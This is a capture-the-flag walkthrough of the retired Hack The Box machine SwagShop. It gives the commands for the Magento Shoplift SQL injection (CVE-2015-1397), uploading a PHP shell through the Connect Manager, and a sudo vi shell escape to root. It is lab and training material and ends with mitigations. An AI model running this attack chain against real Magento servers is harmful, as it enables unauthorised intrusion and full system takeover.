---
machine: SwagShop
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, magento, sqli, cve-2015-1397, connect-manager, sudo, vi, gtfobins]
---

# SwagShop — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Magento 1.9.0.0 with the **Shoplift SQLi (CVE-2015-1397)**, which inserts an admin user. From the dashboard you reach the **Magento Connect Manager** (`/downloader`) and upload a package carrying a PHP shell → `www-data`. Escalation is a `sudo` on `vi` scoped to the webroot: a GTFOBins escape.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh   OpenSSH 7.2p2 Ubuntu
80/tcp open  http  Apache httpd 2.4.29 ((Ubuntu))
```

```bash
echo "<IP> swagshop.htb" | sudo tee -a /etc/hosts
gobuster dir -u http://swagshop.htb -w /usr/share/wordlists/dirb/common.txt
```

`/index.php/admin`, `/downloader` and `/app/etc/local.xml` show up (the last confirms Magento and its version).

## Access

1. **Create an admin with the SQLi**:

```bash
searchsploit -m 37977
python2 37977.py        # point it at the target URL
```

```text
WORKED
Check http://swagshop.htb/index.php/admin with creds <user>:<password>
```

2. **Connect Manager**: with the admin session, `http://swagshop.htb/downloader/` accepts a package upload. Bundle a `shell.php` inside a module structure and install it; the shell ends up under the package path.

3. **Shell** as `www-data` in `/var/www/html`.

## Escalation

```bash
sudo -l
```

```text
User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

Classic escape:

```bash
sudo /usr/bin/vi /var/www/html/index.php -c ':!/bin/sh'
# or inside vi:  :set shell=/bin/bash  then  :shell
```

```text
root@swagshop:/var/www/html# id
uid=0(root)
```

## Pitfalls

- **`/downloader` disabled**: if the Connect Manager is gone, the fallback is *Froghopper* (admin template injection) to run PHP.
- **Shell path**: it depends on packaging; list the directory after installing.
- **`vi` wildcard**: the `sudo` rule covers `/var/www/html/*`, so the file must live under that path.

## Lessons

- An SQLi that inserts an admin turns a CMS into RCE through its own extension panel.
- `sudo` on `vi`/`vim` with wildcards is root: the editor runs commands.
- Mitigation: patch Magento, remove the Connect Manager, and never grant `sudo` on editors.
